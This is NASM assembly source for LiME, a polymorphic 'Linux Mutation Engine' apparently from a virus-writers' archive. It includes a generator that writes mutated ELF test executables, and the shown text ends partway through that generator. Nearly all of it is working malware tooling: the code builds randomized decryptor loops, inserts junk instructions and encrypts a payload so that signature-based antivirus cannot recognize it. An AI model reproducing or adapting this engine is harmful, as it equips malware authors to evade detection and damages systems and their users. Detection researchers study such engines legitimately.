; This file passed through VX Heavens (http://vx.org.ua)
; ***************************************************************
;  To compile [LiME] under Linux with NASM... Follow as:
;  nasm -f elf lime-gen.s
;  ld -e main lime-gen.o -o lime-gen
; ***************************************************************

section .data
global main

; ***************************************************************
;  Linux Mutation Engine (source code)
;  [LiME] Version: 0.2.0                 Last update: 2001/02/28
;  Written by zhugejin at Taipei, Taiwan.       Date: 2000/10/10
;  E-mail: zhugejin.bbs@bbs.csie.nctu.edu.tw
;  WWW: http://cvex.fsn.net
; ***************************************************************

; Input:
;       EBX = pointer to memory buffer where LiME will store decryptor
;	      and encrypted data
;       ECX = pointer to the data, u want to encrypt
;       EDX = size of data, u want to encrypt
;       EBP = delta offset
;
; Output:
;	ECX = address of decryptor+encrypted data
;       EDX = size of decryptor+encrypted data

LIME_BEGIN:
	dd LIME_SIZE            ; size of [LiME]

lime_pre_opcod_tab db 10000000b ; add
		   db 10101000b ; sub
                   db 10110000b ; xor
                   db 10000000b ; add
		   
lime_enc_opcod_tab db  80h,10000000b, 2ah,11000001b	; add/sub
		   db  80h,10101000b, 02h,11000001b	; sub/add
		   db  80h,10110000b, 32h,11000001b	; xor/xor
		   db  82h,10000000b, 2ah,11000001b	; add/sub
		   db  82h,10101000b, 02h,11000001b	; sub/add
		   db  82h,10110000b, 32h,11000001b	; xor/xor
		   db 0c0h,10000000b,0d2h,11001000b	; rol/ror
		   db 0c0h,10001000b,0d2h,11000000b	; ror/rol
		   
		   db 0d0h,10000000b,0d0h,11001000b	; rol/ror
		   db 0d0h,10001000b,0d0h,11000000b	; ror/rol
		   db 0f6h,10010000b,0f6h,11010000b	; not/not
		   db 0f6h,10011000b,0f6h,11011000b	; neg/neg
		   db 0feh,10000000b,0feh,11001000b	; inc/dec
		   db 0feh,10001000b,0feh,11000000b	; dec/inc
		   
		   db  00h,10000000b, 2ah,11000001b	; add/sub
		   db  28h,10000000b, 02h,11000001b	; sub/add
		   db  30h,10000000b, 32h,11000001b	; xor/xor
		    ;--------------------------------------------	
		   db  10h,10000000b, 1ah,11000001b	; adc/sbb
		   db  18h,10000000b, 12h,11000001b	; sbb/adc
		   
		   db  80h,10010000b, 1ah,11000001b	; adc/sbb
		   db  80h,10011000b, 12h,11000001b	; sbb/adc
		   db  82h,10010000b, 1ah,11000001b	; adc/sbb
		   db  82h,10011000b, 12h,11000001b	; sbb/adc

lime_zero_reg_opcod_tab db 29h,00011000b        ; sub reg,reg
                        db 2bh,00011000b        ; sub reg,reg
                        db 31h,00011000b        ; xor reg,reg
                        db 33h,00011000b        ; xor reg,reg
lime_init_reg_opcod_tab db 81h,11000000b        ; add reg,xxxxxxxx
                        db 81h,11001000b        ; or reg,xxxxxxxx
                        db 81h,11110000b        ; xor reg,xxxxxxxx
                        db 81h,11000000b        ; add reg,xxxxxxxx

;-----------------------------------------------
LIME_make_tsh_cod	dd lime_make_tsh_cod
LIME_make_noflags_cod	dd lime_make_noflags_cod
LIME_set_disp_reg	dd lime_set_disp_reg
LIME_save_edi		dd lime_save_edi
@	equ $
LIME_rnd 		dd lime_rnd
LIME_rnd_reg		dd lime_rnd_reg
LIME_rnd_al		dd lime_rnd_al
LIME_rnd_eax_and_al	dd lime_rnd_eax_and_al
LIME_rnd_esi		dd lime_rnd_esi
;-----------------------------------------------

lime_add4_reg_opcod_tab	db 11000000b,11000000b,04h,-4h	; add/add
			db 11000000b,11101000b,-4h,04h	; add/sub
			db 11101000b,11101000b,-4h,04h	; sub/sub
			db 11101000b,11000000b,04h,-4h	; sub/add

lime_mk_mov_cod_addr dw lime_mmc1-@,lime_mmc2-@,lime_mmc3-@
lime_mk_inc_cod_addr dw lime_mic1-@,lime_mic2-@,lime_mic3-@
lime_mk_jxx_cod_addr dw lime_mjc1-@,lime_mjc2-@

lime_mk_tsh_cod_addr dw lime_mtc1-@,lime_mtc2-@,lime_mtc3-@,lime_mtc4-@
                     dw lime_mtc5-@,lime_mtc6-@,lime_mtc7-@,lime_mtc8-@
		     dw lime_mtc9-@
;		     dw lime_simd-@
;		     dw lime_3dnow-@

jxx_addr dd 0
ret_addr dd 0
pre_addr dd 0
pre_count db 0

lime_rnd_val dd 0

orig_reg db 0
disp_reg db 0
temp_reg db 0
key_reg	 db 0

	;   +------------> make no-flags code
	;   |+-----------> *reserved* for SIMD Instruction
	;   ||+----------> *reserved* for 3DNow! Instruction
	;   |||   +------> xchg disp_reg with orig_reg
	;   |||   |
para_eax db 00000000b	; parameters of LiME
para_ebx dd 0		; address of buffer for new decryptor
para_ecx dd 0		; begin of code to be decrypted
para_edx dd 0		; size of code to be decrypted
para_ebp dd 0		; displacement of decryptor
para_esp dd 0

	;   +--------------------> byte / dword
	;   |+-------------------> mod := (disp32/disp8)
	;   ||+------------------> *not used*
	;   |||+-----------------> *not used*
	;   ||||+----------------> inc reg / dec reg
	;   |||||++--------------> *not used*
	;   |||||||+-------------> clc / stc
enc_type dd 00000000b

adr_ndx dd 0
adr_0	dd 0,0,0,0,0,0,0,0
adr_1	dd 0,0,0,0,0,0,0,0
adr_2   dd 0,0,0,0,0,0,0,0
adr_3   dd 0,0,0,0,0,0,0,0

lime_mmx_opcod_tab:
db  60h, 61h, 62h, 63h, 64h, 65h, 66h, 67h, 68h, 69h, 6ah, 6bh, 6eh, 6fh
db  74h, 75h, 76h, 6eh, 6fh,0d1h,0d2h,0d3h,0d5h,0d8h,0d9h,0dbh,0dch,0ddh
db 0dfh,0e1h,0e2h,0e5h,0e8h,0e9h,0ebh,0ech,0edh,0efh,0f1h,0f2h,0f3h,0f5h
db 0f8h,0f9h,0fah,0fch,0fdh,0feh

; ---------------------------------------------------------------

LIME:
        pushf
        cld
        
        mov edi,ebx
        
	push ebp
        call lime_reloc
lime_reloc:
        pop ebp
        sub ebp,lime_reloc-@
        pop dword [ebp-@+para_ebp]
        mov [ebp-@+para_ebx],ebx
        mov [ebp-@+para_ecx],ecx
        mov [ebp-@+para_edx],edx
	mov [ebp-@+para_esp],esp
	
	call lime_make_prefix_decrypt	;
	mov [ebp-@+pre_addr],esp

	mov al,3
	call [ebp-@+LIME_rnd_eax_and_al]
        mov [ebp-@+adr_ndx],eax
        xchg ecx,eax
        inc ecx
        lea esi,[ebp-@+adr_0]
lime_make_next_decrypt:
        call lime_make_decrypt          ;
	ror dword [ebp-@+enc_type],8
        loop lime_make_next_decrypt
        
        call lime_encrypt              	;
        
        mov ecx,[ebp-@+para_ebx]
        mov edx,edi
        sub edx,ecx

	mov esp,[ebp-@+para_esp]       
        popf
        ret
        
; ---------------------------------------------------------------

lime_make_prefix_decrypt:
	pop dword [ebp-@+ret_addr]
        call [ebp-@+LIME_make_tsh_cod]

	mov al,7
	call [ebp-@+LIME_rnd_eax_and_al]
	add al,7
	mov [ebp-@+pre_count],al
	xchg ecx,eax
mk_next_prefix_decrypt:
        call [ebp-@+LIME_make_tsh_cod]
        call [ebp-@+LIME_set_disp_reg]
        
        call lime_make_mov_cod
	push edi			; p0
        stosd
	
	call lime_make_xchg_cod_rnd
	
	mov al,02h
	call [ebp-@+LIME_rnd_eax_and_al]
        add al,81h		; (add/sub/xor) dword [reg+(xxxxxx)xx],xxxxxxxx
        stosb
        push eax
        mov al,03h
        call [ebp-@+LIME_rnd_al]
        lea ebx,[ebp-@+lime_pre_opcod_tab]
	xlatb
        or al,[ebp-@+disp_reg]
        stosb
        pop ebx
	push edi			; p1
        call [ebp-@+LIME_rnd]
        stosd
	jp lmpd_a1
	xor byte [edi-05h],11000000b
	sub edi,byte 03h
lmpd_a1:
        call [ebp-@+LIME_rnd]
        stosd
	cmp bl,83h
	jnz lmpd_a2
	sub edi,byte 03h
lmpd_a2:
    
        loop mk_next_prefix_decrypt
	
        call [ebp-@+LIME_make_tsh_cod]
	push dword [ebp-@+ret_addr]
        ret
        
; ---------------------------------------------------------------

lime_make_decrypt:
        push ecx
        call [ebp-@+LIME_make_tsh_cod]
        call [ebp-@+LIME_set_disp_reg]

;	mov al,0cch
;	stosb					; *test*
	
        call lime_make_mov_cod
	call [ebp-@+LIME_save_edi]      ; a0 = disp value
        stosd
	
	call [ebp-@+LIME_make_tsh_cod]
	call [ebp-@+LIME_rnd]
	and al,11111001b
	mov [ebp-@+enc_type],al
	mov bl,al
	rol al,1
	mov ah,al
	call [ebp-@+LIME_rnd_reg]
	mov [ebp-@+key_reg],al
	shl ah,3
	or al,ah
	or al,0b0h		; mov reg,key
	stosb
	call [ebp-@+LIME_rnd]
	mov [esi+4*6],eax		; a7 = key
	stosd
	test bl,10000000b
	jnz lmd_a1
	sub edi,byte 03h
lmd_a1:
	call [ebp-@+LIME_rnd]
	and al,00000010b
	mov [ebp-@+para_eax],al
	call lime_make_xchg_cod_rnd
	
	call [ebp-@+LIME_save_edi]      ; a1 = address of loop
	call [ebp-@+LIME_make_tsh_cod]
	
	mov al,[ebp-@+disp_reg]
        mov [ebp-@+orig_reg],al
	
        push esi
        lea esi,[ebp-@+lime_enc_opcod_tab]
        mov al,22
        call [ebp-@+LIME_rnd_esi]
	add esi,eax
	cmp eax,byte 16*2
	pushf
        lodsd
	test bl,10000000b
	jz lmd_a2
	or eax,00010001h
lmd_a2:
	popf
	push eax
	jbe mk_no_cf
	mov al,bl
;	and al,01h
	or al,0f8h		; clc / stc
	stosb
	call [ebp-@+LIME_make_noflags_cod]
mk_no_cf:
	pop eax
        pop esi
	mov bh,bl
	and bh,01000000b
	sub ah,bh
        mov [esi],eax			; a2 = decryptic type
        add esi,byte 04h
        or ah,[ebp-@+disp_reg]
	cmp al,40h
	jae lmd_a3
	mov dh,[ebp-@+key_reg]
	rol dh,3
	or ah,dh
lmd_a3:
        stosw			; (add/sub/xor...) (b/w) [reg+(xxxxxx)xx],key
	xchg edx,eax
	call [ebp-@+LIME_rnd]
	jp lmd_a4
	and byte [edi-01h],11111000b
	or byte [edi-01h],00000100b
	and al,11000000b
	or al,00100000b
	or al,[ebp-@+disp_reg]
	stosb
lmd_a4:
        call [ebp-@+LIME_save_edi]      ; a3 = address of displacement
        call [ebp-@+LIME_rnd]
        stosd
	test bl,01000000b
	jz lmd_a5
	sub edi,byte 03h
lmd_a5:
	cmp dl,0d0h
	jae mk_no_val
	cmp dl,40h
	jb mk_no_val
        call [ebp-@+LIME_rnd]
	and al,7fh
	stosd
	cmp dl,81h
	jz lmd_a6
	and eax,byte 7fh
	sub edi,byte 03h
lmd_a6:
	mov [esi+4*3],eax		; a7 = key
mk_no_val:
        
	call lime_make_xchg_cod_rnd
        call lime_make_inc_cod	; (inc/dec) reg
        call lime_make_xchg_cod_rnd
        
        mov ax,0f881h           ; cmp reg,xxxxxxxx
        or ah,[ebp-@+disp_reg]
        stosw
	call lime_aox_eax
        call [ebp-@+LIME_save_edi]      ; a4 = address of "cmp reg,xxxxxxxx"
        stosd
        
	call [ebp-@+LIME_make_noflags_cod]
	
	test byte [ebp-@+para_eax],00000010b
	jz mk_no_xchg
    	mov al,04h
	call [ebp-@+LIME_rnd_eax_and_al]
	add al,87h		; xchg orig_reg,disp_reg
	stosb
	mov al,[ebp-@+orig_reg]
	mov ah,al
	xchg [ebp-@+disp_reg],al
	dec edi
	cmp ah,al
	jz mk_no_xchg
	inc edi
	rol ah,3
	or al,ah
	or al,11000000b
	cmp byte [edi-01h],87h
	jnz lmd_a7
	call lime_xchg_reg
lmd_a7:
	stosb
	call [ebp-@+LIME_make_noflags_cod]
mk_no_xchg:
	and byte [ebp-@+para_eax],11111101b
        
        call lime_make_jz_cod	; jxx (xxxxxx)xx
        call [ebp-@+LIME_save_edi]      ; a5 = address of "jxx xx"
        
        call [ebp-@+LIME_make_noflags_cod]
        
        mov al,0e9h		; jmp xxxxxxxx
        stosb
        mov eax,[esi-5*4]	; address of loop
        sub eax,edi
        dec eax
	cmp eax,byte -80h
        jae mk_short_jmp
        sub eax,byte 03h
        stosd
        jmp short mk_jmp_end
mk_short_jmp:
        mov byte [edi-01h],0ebh	; jmp xx
        stosb
mk_jmp_end:
        
	call lime_rnd_trash
        call [ebp-@+LIME_save_edi]      ; a6
        
        push esi
        mov esi,[esi-4*2]	; address of "jxx xx"
        mov eax,edi
        sub eax,esi
        cmp byte [esi-02h],00h
        jnz mk_jz_a
        sub esi,byte 03h
mk_jz_a:
        mov [esi-01h],al
        pop esi
	add esi,byte 04h
        
        pop ecx
        ret
	
; -------------------------------	
;	...
;	mov reg,xxxxxxxx <---- a0
;	...
;a1:	
;	...
;	xor [eax+xx],key <---- a7
;	^^^(a2)  ^^a3
;	...
;	inc eax
;	...
;	cmp eax,xxxxxxxx <---- a4
;	...
;	jz a6
;a5:
;	...
;	jmp a1
;	...
;a6:
; -------------------------------	

; ---------------------------------------------------------------
        
lime_encrypt:
        mov ecx,[ebp-@+para_edx]
        mov esi,[ebp-@+para_ecx]
        repz movsb

        push edi
calc_disp:
	rol dword [ebp-@+enc_type],8
	mov eax,0aa9090ach
	test byte [ebp-@+enc_type],10000000b
	jz le_a1
	or eax,01000001h
le_a1:
	mov [ebp-@+enc_buff-01h],eax

        lea esi,[ebp-@+adr_0]
        imul ebx,[ebp-@+adr_ndx],byte 4*8
        lea edx,[esi+ebx]
	mov eax,edi
	mov esi,edi
	sub eax,[edx+4*6]
	and al,11111100b
	add eax,byte 04h
	sub esi,eax
	mov eax,esi
	
        sub eax,[ebp-@+para_ebx]
        add eax,[ebp-@+para_ebp]
        mov ebx,[edx+4*3]
	mov ecx,[ebx]
	test byte [ebp-@+enc_type],01000000b
	jz le_a2
	movsx ecx,cl
le_a2:
        sub eax,ecx
        mov ecx,[edx+4*7]	; decryptic value
	
	test byte [ebp-@+enc_type],00001000b
	jnz le_a3
        mov ebx,[edx]		; address of "mov reg,xxxxxxxx"
        mov [ebx],eax
        add eax,edi
        sub eax,esi
        mov ebx,[edx+4*4]	; address of "cmp reg,xxxxxxxx"
	jmp short le_a4
le_a3:
        mov ebx,[edx+4*4]	; address of "cmp reg,xxxxxxxx"
        mov [ebx],eax
        add eax,edi
        sub eax,esi
        mov ebx,[edx]		; address of "mov reg,xxxxxxxx"
le_a4:
        mov [ebx],eax
        
;       jmp _test1_lime_encrypt			; *test*
        mov eax,[edx+4*2]       ; decryptic type
	shr eax,16
        mov [ebp-@+enc_buff],ax
        mov ebx,edi
        mov edi,esi
	
	mov al,[ebp-@+enc_type]
;	and al,1
	or al,0f8h		; clc / stc
	mov [ebp-@+enc_buff-02h],al

encrypt_prog:
	db 90h
        lodsb			; 0ach
enc_buff db 90h,90h
        stosb			; 0aah
	cmp esi,ebx
        jb encrypt_prog
_test1_lime_encrypt:

        cmp byte [ebp-@+adr_ndx],0
        jz lime_prefix_encrypt
        dec byte [ebp-@+adr_ndx]
        jmp calc_disp

; ---------------------------------------------------------------
        
lime_prefix_encrypt:
;	jmp _test2_lime_encrypt			; *test*
	movzx ecx,byte [ebp-@+pre_count]
	mov edi,[ebp-@+pre_addr]
lpe_next:
	mov al,1fh
	call [ebp-@+LIME_rnd_eax_and_al]
        add eax,[ebp-@+adr_0+4*1]	; address of loop
	mov ebx,eax
        sub eax,[ebp-@+para_ebx]
        add eax,[ebp-@+para_ebp]
	mov esi,[edi]
	mov edx,[esi]
	push esi
	add esi,byte 04h
	test byte [esi-05h],01000000b
	jz lpe_a1
	movsx edx,dl
	sub esi,byte 03h
lpe_a1:
        sub eax,edx
	mov edx,[edi+04h]
	mov [edx],eax
	add edi,byte 08h
        mov edx,[esi]
	pop esi
        mov eax,[esi-02h]
	cmp al,83h
	jnz lpe_a2
	movsx edx,dl
lpe_a2:
        and ah,00111000b
        jz lpe_sub
        cmp ah,00101000b
        jz lpe_add
        xor [ebx],edx
        loop lpe_next
        jmp short lime_encrypt_end
lpe_sub:
        sub [ebx],edx
        loop lpe_next
        jmp short lime_encrypt_end
lpe_add:
        add [ebx],edx
        loop lpe_next
_test2_lime_encrypt:

lime_encrypt_end:
        pop edi
	call lime_rnd_trash
        ret

; ---------------------------------------------------------------

lime_set_disp_reg:
	push edx
lsdr_l:
	mov al,111b
        call [ebp-@+LIME_rnd_al]
        cmp al,100b
        jz lsdr_l
	mov dl,[ebp-@+key_reg]
	test bl,10000000b
	jnz lsdr_a
	and dl,011b
lsdr_a:
	cmp al,dl
	jz lsdr_l
	cmp al,[ebp-@+disp_reg]
	jz lsdr_l
        mov [ebp-@+disp_reg],al
        mov [ebp-@+temp_reg],al
	pop edx
        ret

lime_rnd:
        push edx
        rdtsc
        xor eax,[ebp-@+lime_rnd_val]
        adc eax,edi
	neg eax
	sbb eax,edx
	rcr eax,1
        xor [ebp-@+lime_rnd_val],eax
        pop edx
        ret

lime_rnd_eax_and_al:
	push edx
	movzx edx,al
	call [ebp-@+LIME_rnd]
	and eax,edx
	pop edx
	ret

lime_rnd_al:
	push edx
	mov edx,eax
lra_l:	
	call [ebp-@+LIME_rnd]
	cmp al,dl
	ja lra_l
	mov dl,al
	xchg eax,edx
	pop edx
	ret

lime_rnd_esi:
	and eax,byte 07fh
	call [ebp-@+LIME_rnd_al]
        add eax,eax
        add esi,eax
        ret

lime_rnd_addr:
	call [ebp-@+LIME_rnd_esi]
	movzx eax,word [esi]
	lea esi,[eax+@]
	ret

lime_save_edi:
        mov [esi],edi
        add esi,byte 04h
        ret

lime_rnd_reg_dd:
	mov al,01h
lime_rnd_reg:
	push ecx
	push edx
        xchg edx,eax
lrr_l:
	mov al,111b
	call [ebp-@+LIME_rnd_al]
	mov ah,al
        test dl,01h
        jnz lrr_w
        and al,011b
lrr_w:
        cmp al,100b
        jz lrr_l
        cmp al,[ebp-@+disp_reg]
        jz lrr_l
	cmp al,[ebp-@+temp_reg]
	jz lrr_l
	and al,011b
	mov cl,[ebp-@+key_reg]
	and cl,011b
	cmp al,cl
	jz lrr_l
	mov dl,ah
	xchg eax,edx
	pop edx
	pop ecx
        ret
	
lime_rnd_trash:	
	push ecx
	mov al,3
	call [ebp-@+LIME_rnd_eax_and_al]
	or al,04h
	xchg ecx,eax
lrt_l:	
	call [ebp-@+LIME_rnd]
	stosb
	loop lrt_l
	pop ecx
	ret
	
lime_rnd_rm:
	push edx	
	xor edx,edx
	mov dl,al
	mov ah,al
	rol ah,3
	mov al,[edi-01h]
	call [ebp-@+LIME_rnd_reg]
	or ah,al
	rol ah,3
	mov al,[edi-01h]
	call [ebp-@+LIME_rnd_reg]
	or al,ah
	stosb
	cmp dl,11b
	jz lrr_a2
	and al,11000111b
	push eax
	cmp eax,edi
	jp lrr_a1
	or ah,00000100b
	mov [edi-01h],ah
	mov ah,al
	mov al,0ffh
	call [ebp-@+LIME_rnd_al]
	and al,11111000b
	xor al,ah
	stosb
lrr_a1:
	call [ebp-@+LIME_rnd]
	stosd
	pop eax
	cmp al,00000101b
	jz lrr_a2
	cmp dl,10b
	je lrr_a2
	sub edi,byte 04h
	add edi,edx
lrr_a2:
	pop edx
        ret
	
lime_xchg_reg:
	push edx
	cmp eax,edi
	jp lxr_e
	and al,00111111b
	mov edx,eax
	shr al,3
	shl dl,3
	or al,dl
	or al,11000000b
lxr_e:
	pop edx
	ret	

lime_aox_eax:
	cmp eax,edi
	jp lae_e
	test byte [edi-01h],111b
	jnz lae_e
	dec edi
	mov al,[edi]
	dec edi
	and al,00111000b
	or al,00000101b
	stosb
lae_e:
	ret

; ---------------------------------------------------------------

lime_make_mov_cod:
        push esi
        lea esi,[ebp-@+lime_mk_mov_cod_addr]
        mov al,02h
        call lime_rnd_addr
        call esi
        pop esi
        ret
lime_mmc1:
        mov al,0b8h		; mov reg,xxxxxxxx
        or al,[ebp-@+disp_reg]
        stosb
        ret
lime_mmc2:			; set reg=0 / (add/or/xor) reg,xx
        lea esi,[ebp-@+lime_zero_reg_opcod_tab]
        mov al,03h
        call [ebp-@+LIME_rnd_esi]
        lodsd
        or ah,[ebp-@+disp_reg]
        rol ah,3
        or ah,[ebp-@+disp_reg]
        stosw
	call lime_make_xchg_cod_rnd
	lea esi,[ebp-@+lime_init_reg_opcod_tab]
        mov al,03h
        call [ebp-@+LIME_rnd_esi]
        lodsd
        or ah,[ebp-@+disp_reg]
        stosw
	call lime_aox_eax
        ret
lime_mmc3:
	mov ax,0a08dh		; lea reg,xxxxxxxx
	or ah,[ebp-@+disp_reg]
	rol ah,3
	stosw
	ret

lime_make_xchg_cod_rnd:
	cmp eax,edi
	jp lime_mxc_e
	or byte [ebp-@+para_eax],00000010b
	call [ebp-@+LIME_make_tsh_cod]
	mov dl,[ebp-@+disp_reg]
	mov al,07h
	call [ebp-@+LIME_rnd_eax_and_al]
	test byte [ebp-@+key_reg],011b
	jz lime_mxc_a1
	test al,100b
	jnz lime_mxc_a6
lime_mxc_a1:
	and al,011b
	test al,01b
	jz lime_mxc_a4
	cmp dl,101b
	jnz lime_mxc_a2
	and al,01b
lime_mxc_a2:
	add al,8ah
	stosb
	call [ebp-@+LIME_set_disp_reg]
	rol al,3
	or al,dl
	stosb
	cmp byte [edi-02h],8dh
	jz lime_mxc_a3
	or byte [edi-01h],11000000b
lime_mxc_a3:
	jmp short lime_mxc_e
lime_mxc_a4:
	add ax,1887h		; mov ah,00011regb
	stosb
	or ah,[ebp-@+disp_reg]
	rol ah,3
	call [ebp-@+LIME_set_disp_reg]
	or al,ah
	cmp byte [edi-01h],87h
	jnz lime_mxc_a5
	call lime_xchg_reg
lime_mxc_a5:
	stosb
lime_mxc_e:
	call [ebp-@+LIME_make_tsh_cod]
	ret
lime_mxc_a6:
	call [ebp-@+LIME_set_disp_reg]
	cmp dl,000b
	jz lime_mxc_a7
	mov al,90h
	or al,dl
	mov byte [ebp-@+disp_reg],00h
	jmp short lime_mxc_a5
lime_mxc_a7:
	call [ebp-@+LIME_set_disp_reg]
	or al,90h
	jmp short lime_mxc_a5

; ---------------------------------------------------------------

lime_make_inc_cod:
        push esi
        lea esi,[ebp-@+lime_mk_inc_cod_addr]
        mov al,01h
        call lime_rnd_addr
	mov al,bl
	and al,00001000b
        or al,[ebp-@+disp_reg]
	test bl,10000000b
	jz lime_mic_t
	lea esi,[ebp-@+lime_mic3]
lime_mic_t:
        call esi
        pop esi
        ret
lime_mic1:
        or al,40h		; (inc/dec) reg
        stosb
        ret
lime_mic2:
	or al,11000000b
	mov ah,al
	mov al,0ffh		; (inc/dec) reg
        stosw
        ret
lime_mic3:			; (add/sub) reg,xx / (add/sub) reg,xx
	mov al,81h
	stosb
        lea esi,[ebp-@+lime_add4_reg_opcod_tab]
        mov al,03h
        call [ebp-@+LIME_rnd_esi]
	add esi,eax
	mov edx,[esi]
	mov al,dl
	or al,[ebp-@+disp_reg]
	stosb
	call lime_aox_eax
	call [ebp-@+LIME_rnd]
	stosd
	xchg ecx,eax
	push edx
	call lime_make_xchg_cod_rnd
	pop edx
	mov al,81h
	stosb
	mov al,dh
	or al,[ebp-@+disp_reg]
	stosb
	call lime_aox_eax
	cmp dh,dl
	jnz lime_mic3_a1
	neg ecx
lime_mic3_a1:
	xchg eax,edx
	shr eax,16
	test bl,00001000b
	jz lime_mic3_a2
	shr eax,8
lime_mic3_a2:
	movsx eax,al
	add eax,ecx
	stosd
	ret

; ---------------------------------------------------------------

lime_make_jz_cod:
        push esi
        lea esi,[ebp-@+lime_mk_jxx_cod_addr]
        mov al,01h
        call lime_rnd_addr
	mov al,01h
	call [ebp-@+LIME_rnd_al]
	test bl,00001000b
        call esi
        pop esi
        ret
lime_mjc1:
	jz lime_mjc1_a
	mov al,0ffh
lime_mjc1_a:
        add al,73h		; jz(ae/b) xx
        stosw
        ret
lime_mjc2:
	mov ah,al
	jz lime_mjc2_a
	mov ah,0ffh
lime_mjc2_a:
        add ah,83h		; jz(ae/b) xxxxxxxx
	mov al,0fh
        stosw
        xor eax,eax
        stosd
        ret

; ---------------------------------------------------------------

lime_make_noflags_cod:
        or byte [ebp-@+para_eax],10000000b
	call [ebp-@+LIME_make_tsh_cod]
        and byte [ebp-@+para_eax],01111111b
	ret

lime_make_tsh_cod:
;	ret					; *test*
	push ebx
        push ecx
	push edx
        push esi
	mov al,3
	call [ebp-@+LIME_rnd_eax_and_al]
        or eax,byte 01h
        xchg ecx,eax
lmtc_l:
        lea esi,[ebp-@+lime_mk_tsh_cod_addr]
	xor eax,eax
	mov al,08h
        test byte [ebp-@+para_eax],10000000b
        jz lmtc_t1
        mov al,03h
lmtc_t1:
	call [ebp-@+LIME_rnd_al]
	rol eax,1
        add esi,eax
	movzx eax,word [esi]
	lea esi,[eax+@]
        call [ebp-@+LIME_rnd]
        call esi
        mov esi,[ebp-@+jxx_addr]
        or esi,esi
        jz lmtc_t2
        mov eax,edi
        sub eax,esi
        cmp eax,byte 02h
        jbe lmtc_t2
        mov [esi-01h],al
        and dword [ebp-@+jxx_addr],byte 00h
lmtc_t2:
        loop lmtc_l
        and dword [ebp-@+jxx_addr],byte 00h
        pop esi
	pop edx
        pop ecx
	pop ebx
        ret

lime_mtc1:			; 8087
	and al,00000100b
        or al,0d8h
        stosb
lmtc1_a1:
        mov al,ah
        and ah,00000111b
        cmp ah,00000101b
        jnz lmtc1_a2
        and al,00111111b
        stosb
	mov al,7fh
	call [ebp-@+LIME_rnd_eax_and_al]
        add eax,[ebp-@+para_ebp]
        stosd
        ret
lmtc1_a2:
        or al,11000000b
        stosb
        ret

lime_mtc2:
	mov al,0fh
	call [ebp-@+LIME_rnd_al]
	or al,80h
	cmp al,8dh		; lea reg,[reg]
	jz lmtc2_a
	cmp al,8bh
	ja lime_mtc2
	cmp al,86h
	jb lime_mtc2
	stosb			; (xchg/mov) reg,reg
	mov al,11b
	call lime_rnd_rm
	jmp short lime_mtc2
lmtc2_a:
	stosb
	mov al,10b
	call [ebp-@+LIME_rnd_al]
	call lime_rnd_rm
	ret

lime_mtc3:			; MMX
        push eax
        mov al,0fh
        stosb
        lea ebx,[ebp-@+lime_mmx_opcod_tab]
	mov al,2fh
	call [ebp-@+LIME_rnd_al]
	xlatb
	stosb
        pop eax
        or al,11000000b
        stosb
        ret

lime_mtc4:
        and al,01h
        mov dl,al
        shl dl,3
        call [ebp-@+LIME_rnd_reg]
        or al,0b0h		; mov reg,xxxxxx(xx)
        or al,dl
        stosb
        cmp al,0b8h
        jb lmtc4_a
        call [ebp-@+LIME_rnd]
        and eax,0bfff83ffh
        stosd
        ret
lmtc4_a:
        call [ebp-@+LIME_rnd]
        stosb
        ret

lime_mtc5:
        and al,03h
        or al,80h		; (add/or/adc/sbb/and/sub/xor/cmp) reg,xx
        stosb
        call [ebp-@+LIME_rnd_reg]
        or al,11000000b
        stosb
        call [ebp-@+LIME_rnd]
        and eax,83ffbfffh
        stosd
        cmp byte [edi-06h],81h
        jz lime_mtc5_a
	sub edi,byte 03h
lime_mtc5_a:
;       ret

lime_mtc6:
        cmp dword [ebp-@+jxx_addr],byte 00h
        jnz lime_mtc4
	mov al,0fh
	call [ebp-@+LIME_rnd_eax_and_al]     
        or al,70h		; jxx xx
        stosw
        mov [ebp-@+jxx_addr],edi
        call lime_mtc5
        ret

lime_mtc7:
	jp lime_mtc7_a
        and al,01h
        or al,0feh		; (inc/dec) reg
        stosb
        call [ebp-@+LIME_rnd_reg]
        and ah,00001000b
        or al,11000000b
        or al,ah
        stosb
        ret
lime_mtc7_a:
	call lime_rnd_reg_dd
	and ah,00001000b
        or ah,40h		; (inc/dec) reg
        or al,ah
        stosb
        ret

lime_mtc8:
;	ret
	call lime_rnd_reg_dd
	mov dl,al
	mov [ebp-@+temp_reg],al
	or al,0b8h		; mov reg,xxxxxxxx
	stosb
	call [ebp-@+LIME_rnd]
	stosd
	push edi
	push eax
	call [ebp-@+LIME_make_noflags_cod]
	call [ebp-@+LIME_rnd]
	and al,08h
	or al,40h		; (inc/dec) reg
	or al,[ebp-@+temp_reg]
	stosb
	push eax
	call [ebp-@+LIME_make_noflags_cod]
	mov ax,0f881h		; cmp reg,xxxxxxxx
	or ah,[ebp-@+temp_reg]
	stosw
	mov al,7fh
	call [ebp-@+LIME_rnd_eax_and_al]
	or al,10h
	pop edx
	test dl,08h
	pop edx
	jnz lime_mtc8_a1
	add eax,edx
    	jmp short lime_mtc8_a2
lime_mtc8_a1:
	xchg eax,edx
    	sub eax,edx
lime_mtc8_a2:
	stosd
	call [ebp-@+LIME_make_noflags_cod]
	mov al,[ebp-@+disp_reg]
	mov [ebp-@+temp_reg],al
	mov al,75h		; jnz xx
	stosw
	cmp eax,edi
	jp lime_mtc8_a3
	pop eax
	sub eax,edi
	cmp eax,byte -80h
	jb lime_mtc8_a4
	mov [edi-01h],al
	ret
lime_mtc8_a3:
	pop eax
lime_mtc8_a4:	
	push edi
	call lime_rnd_trash
	pop edx
	mov eax,edi
	sub eax,edx
	mov [edx-01h],al
	ret

lime_mtc9:			; (add/or/adc/sbb/and/sub/xor/cmp) reg,reg
	call [ebp-@+LIME_rnd]
	and al,00111011b
	stosb
	call [ebp-@+LIME_rnd_reg]
	or al,00011000b
	rol al,3
	mov ah,al
	mov al,[edi-01h]
	call [ebp-@+LIME_rnd_reg]
	or al,ah
	stosb
	ret

; ---------------------------------------------------------------

LIME_END:
LIME_SIZE equ LIME_END-LIME_BEGIN

; ***************************************************************
;  [LiME] test files generator
; ***************************************************************

main:
        mov eax,4
        mov ebx,1
        mov ecx,gen_msg
        mov edx,gen_msg_len
        int 80h

        mov ecx,50
gen_l1:
        push ecx

        mov eax,8
        mov ebx,filename
        mov ecx,000111111101b	; 000rwxrwxrwx
        int 80h
        
        push eax
        
        mov eax,0
        mov ebx,host_entry
        mov ecx,host
        mov edx,host_len
        mov ebp,[e_entry]
        call LIME
        
        pop ebx
        
        mov eax,4
        mov ecx,elf_head
        add edx,host_entry-elf_head
        mov [p_filsz],edx
        mov [p_memsz],edx
        int 80h
        
        mov eax,6
        int 80h
        
        lea ebx,[filename+1]
